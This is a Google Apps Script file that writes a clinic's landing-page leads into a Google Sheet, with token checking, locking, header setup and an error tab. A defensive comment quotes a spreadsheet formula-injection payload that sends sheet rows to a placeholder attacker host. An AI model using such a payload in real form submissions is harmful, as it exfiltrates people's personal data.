/* ════════════════════════════════════════════════════════════
   Velaxa Clinic — landing-page form  →  Google Sheet
   ════════════════════════════════════════════════════════════

   HOW TO INSTALL (once, ~3 minutes)

   1. Open the sheet:
      https://docs.google.com/spreadsheets/d/174maOlfdyBL5WAidZB62me_bDKqVdNG25FFn3AFu3oM/edit
   2. Extensions → Apps Script. Delete whatever is in the editor and paste
      this whole file. Save (⌘S).
   3. Pick `setupSheet` in the function dropdown and press Run. Approve the
      permission prompt (it is your own sheet). The tab, the header row, the
      widths and the Status dropdown all appear now — no typing needed.
   4. Deploy → New deployment → gear icon → Web app
         Description:  Velaxa leads
         Execute as:   Me
         Who has access: Anyone            ← must be "Anyone", not "Anyone with Google account"
      Deploy, then copy the Web app URL (it ends in /exec).
   5. Put that URL in SHEET_ENDPOINT at the top of js/main.js.

   AFTER ANY EDIT to this file: Deploy → Manage deployments → edit → Version:
   New version → Deploy. Without that, the old code keeps running.

   A LEAD THAT CANNOT BE SAVED is parked in an "Errors" tab of this same
   spreadsheet, reason and payload side by side, so it can be re-entered by hand.
   No email: MailApp needs the script.send_mail scope, which this account refused
   to grant however it was asked. To be emailed anyway, use Sheets itself —
   Tools → Notification settings → "Notify me when any changes are made".
   ════════════════════════════════════════════════════════════ */

/* Only used if this code is ever run as a standalone project. Pasted into the
   sheet's own Apps Script editor — the normal case — the script follows whatever
   sheet it lives in, so transferring or copying the file never sends leads to
   the wrong spreadsheet. */
const SPREADSHEET_ID = "174maOlfdyBL5WAidZB62me_bDKqVdNG25FFn3AFu3oM";
const SHEET_NAME = "Leads";
const TIMEZONE = "Europe/Istanbul";

/* The sheet's columns, in order.
   `key`     — the field the landing page sends; null means the column is yours
               to fill in by hand and the script never writes over it.
   `fill`    — a value written on every new row (used to seed Status).        */
const COLUMNS = [
  { header: "Submitted At", key: "_stamp",    width: 150 },
  { header: "Full Name",    key: "fullName",  width: 190 },
  { header: "Country",      key: "country",   width: 160 },
  { header: "State",        key: "state",     width: 130 },
  { header: "WhatsApp",     key: "whatsapp",  width: 160 },
  { header: "Treatment",    key: "treatment", width: 240 },
  { header: "Status",       key: null,        width: 130, fill: "New" },
  { header: "Notes",        key: null,        width: 280 },
  { header: "Source Page",  key: "page",      width: 230 },
];

const STATUSES = ["New", "Contacted", "Quoted", "Booked", "Not interested"];

/* Sent by the landing page with every lead. This is NOT a secret — it sits in
   public JavaScript — it is a doorman: the /exec URL is guessable-by-scraping,
   and this turns away the drive-by bots that find it without reading the page.
   Change it here and in SHEET_TOKEN in js/main.js together, then redeploy. */
const SHARED_TOKEN = "velaxa-2026-8f3ac1";

/* Longest text accepted in one cell, so nobody can paste a novel into the sheet */
const MAX_CELL = 300;

/* Second tab, created on demand, where a lead that could not be saved is parked
   together with the reason — so a failure is visible where you already look. */
const ERROR_SHEET_NAME = "Errors";

/* ── The endpoint the landing page posts to ───────────────── */
function doPost(e) {
  /* Anything unreadable or unauthenticated is turned away before we touch the
     sheet OR the alert email. Deliberately outside the try below: a bot posting
     rubbish must not be able to trigger an email — six an hour would burn the
     daily quota and leave real failures unreported. */
  let data;
  try {
    data = JSON.parse(e.postData.contents);
  } catch (parseErr) {
    console.error("Unreadable body", parseErr);
    return reply("bad request");
  }
  if (!data || data.token !== SHARED_TOKEN) return reply("rejected");

  /* Two people submitting in the same second must not land on the same row */
  const lock = LockService.getScriptLock();
  lock.waitLock(30000);
  try {
    const sheet = getSheet();

    sheet.appendRow(COLUMNS.map((column) => {
      if (column.key === "_stamp") return stamp();
      if (column.fill) return column.fill;
      if (!column.key) return "";
      return safeCell(data[column.key]);
    }));

    return reply("ok");
  } catch (err) {
    /* Logged under Executions in the Apps Script editor */
    console.error(err);
    /* The visitor's browser cannot read this reply, so without an email the
       failure would be silent — and the lead gone. */
    alertFailure(err, JSON.stringify(data));
    return reply("error: " + err.message);
  } finally {
    lock.releaseLock();
  }
}

/* Opening the /exec URL in a browser should say this — a quick way to confirm
   the deployment is live and readable by "Anyone". */
function doGet() {
  return reply("Velaxa lead endpoint is live.");
}

/**
 * Run this from the editor to see the failure trail working: it writes one
 * sample row into the Errors tab. Delete that row afterwards.
 */
function testAlert() {
  alertFailure(
    new Error("This is a test, nothing is actually wrong"),
    '{"fullName":"Test Person","country":"Türkiye","whatsapp":"+905526815449","treatment":"Veneers"}');
  return 'Wrote a test row into the "' + ERROR_SHEET_NAME + '" tab';
}

/* ── Run this once from the editor to build the sheet ─────── */
function setupSheet() {
  const sheet = getSheet();
  book().toast('Sheet "' + SHEET_NAME + '" is ready for leads.', "Velaxa", 5);
  return sheet.getName();
}

/* ── Internals ────────────────────────────────────────────── */

/* The spreadsheet this script belongs to, whoever owns it today */
function book() {
  return SpreadsheetApp.getActiveSpreadsheet() || SpreadsheetApp.openById(SPREADSHEET_ID);
}

function getSheet() {
  const ss = book();
  let sheet = ss.getSheetByName(SHEET_NAME);

  if (!sheet) {
    /* Reuse the untouched default tab rather than leaving an empty "Sheet1" */
    const sheets = ss.getSheets();
    sheet = (sheets.length === 1 && sheets[0].getLastRow() === 0)
      ? sheets[0].setName(SHEET_NAME)
      : ss.insertSheet(SHEET_NAME);
  }

  ensureHeaders(sheet);
  return sheet;
}

function ensureHeaders(sheet) {
  const headers = COLUMNS.map((c) => c.header);
  const width = headers.length;

  if (sheet.getLastRow() > 0) {
    const current = sheet.getRange(1, 1, 1, width).getValues()[0];
    if (current.join("|") === headers.join("|")) return;   /* already set up */
    /* Existing rows with different headers: refuse rather than shift real data
       into the wrong columns. Rename or clear the tab and run setupSheet again. */
    throw new Error(
      'The "' + SHEET_NAME + '" tab already has different headers. Clear it (or ' +
      "rename the tab) and run setupSheet again — nothing was changed.");
  }

  sheet.getRange(1, 1, 1, width)
    .setValues([headers])
    .setFontWeight("bold")
    .setBackground("#203f69")      /* the brand navy, white text on top */
    .setFontColor("#ffffff")
    .setVerticalAlignment("middle");

  sheet.setRowHeight(1, 34);
  sheet.setFrozenRows(1);
  COLUMNS.forEach((column, i) => sheet.setColumnWidth(i + 1, column.width));

  /* Trim the sheet to the columns in use, so the grid ends where the data ends */
  const extra = sheet.getMaxColumns() - width;
  if (extra > 0) sheet.deleteColumns(width + 1, extra);

  /* Status becomes a dropdown instead of free text */
  const statusCol = headers.indexOf("Status") + 1;
  sheet.getRange(2, statusCol, sheet.getMaxRows() - 1, 1).setDataValidation(
    SpreadsheetApp.newDataValidation()
      .requireValueInList(STATUSES, true)
      .setAllowInvalid(false)
      .build());

  /* Long text should wrap in Notes, everything else stays on one line */
  sheet.getRange(2, headers.indexOf("Notes") + 1, sheet.getMaxRows() - 1, 1)
    .setWrap(true);

  if (!sheet.getFilter()) sheet.getRange(1, 1, sheet.getMaxRows(), width).createFilter();
}

/**
 * Turns a submitted value into something a spreadsheet can only ever display.
 *
 * Sheets evaluates a cell that begins with = + - @ as a formula, so a name
 * submitted as =IMAGE("http://attacker/?"&B2) would run the moment you open the
 * sheet and hand your rows to whoever wrote it. A leading apostrophe forces
 * plain text; Sheets hides it and the value copies out clean. It also keeps
 * "+905526815449" looking like a phone number instead of being read as maths.
 */
function safeCell(value) {
  let text = String(value == null ? "" : value)
    .replace(/[\x00-\x1F\x7F]/g, " ")   /* control characters, newlines included */
    .trim();

  if (text.length > MAX_CELL) text = text.slice(0, MAX_CELL) + "…";

  return /^[=+\-@\t\r]/.test(text) ? "'" + text : text;
}

/**
 * Records a lead that could not be written, into an "Errors" tab of the same
 * spreadsheet, with the lead itself alongside so it can be pasted into Leads by
 * hand and nothing is lost.
 *
 * Deliberately not email: MailApp needs an extra authorisation scope that this
 * account would not grant, and a lost lead you can see beats a perfect design
 * you cannot deploy. To be emailed about it anyway, use Sheets' own feature —
 * Tools → Notification settings → "Notify me when… any changes are made".
 * That is native to Sheets and needs nothing from this script.
 *
 * It never throws: a failure to record a failure must not break the endpoint.
 */
function alertFailure(err, rawBody) {
  try {
    const ss = book();
    let tab = ss.getSheetByName(ERROR_SHEET_NAME);

    if (!tab) {
      tab = ss.insertSheet(ERROR_SHEET_NAME);
      tab.getRange(1, 1, 1, 3)
        .setValues([["When", "What went wrong", "The lead — paste it into Leads by hand"]])
        .setFontWeight("bold").setBackground("#e2574c").setFontColor("#ffffff");
      tab.setFrozenRows(1);
      tab.setColumnWidth(1, 150);
      tab.setColumnWidth(2, 340);
      tab.setColumnWidth(3, 520);
    }

    tab.appendRow([stamp(), safeCell(err.message), safeCell(rawBody)]);
  } catch (logErr) {
    /* Nothing left but the Executions log — this is the case where the sheet
       itself is unreachable, so no amount of writing to it would help. */
    console.error("Could not record the failed lead", logErr);
  }
}

function stamp() {
  return Utilities.formatDate(new Date(), TIMEZONE, "yyyy-MM-dd HH:mm");
}

function reply(text) {
  return ContentService.createTextOutput(text).setMimeType(ContentService.MimeType.TEXT);
}
